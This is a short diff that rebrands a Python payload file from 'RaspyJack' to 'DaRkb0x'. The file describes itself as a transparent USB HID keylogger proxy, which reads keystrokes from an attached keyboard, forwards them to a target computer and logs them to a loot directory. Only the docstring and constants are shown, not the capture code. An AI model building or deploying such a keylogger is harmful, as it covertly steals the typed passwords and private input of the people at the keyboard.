@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- Transparent USB HID Keylogger Proxy
+DaRkb0x Payload -- Transparent USB HID Keylogger Proxy
 =========================================================
 Author: 7h30th3r0n3
 
@@ -9,7 +9,7 @@ USB port 1 (host mode) reads keystrokes via evdev.
 USB port 2 (OTG) is configured as a HID gadget (/dev/hidg0)
 that forwards every keystroke transparently to the target.
 
-All keystrokes are logged to /root/Raspyjack/loot/Keylogger/.
+All keystrokes are logged to /root/DaRkb0x/loot/Keylogger/.
 
 Setup / Prerequisites:
   - Requires 2 USB ports. Port 1: keyboard plugged in (host mode,
@@ -56,9 +56,9 @@ font = scaled_font()
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-LOOT_DIR = "/root/Raspyjack/loot/Keylogger"
+LOOT_DIR = "/root/DaRkb0x/loot/Keylogger"
 GADGET_BASE = "/sys/kernel/config/usb_gadget"
-GADGET_NAME = "raspyjack_keylog"
+GADGET_NAME = "darkbox_keylog"
 HID_DEV = "/dev/hidg0"
 EVDEV_DIR = "/dev/input"
 ROWS_VISIBLE = 7
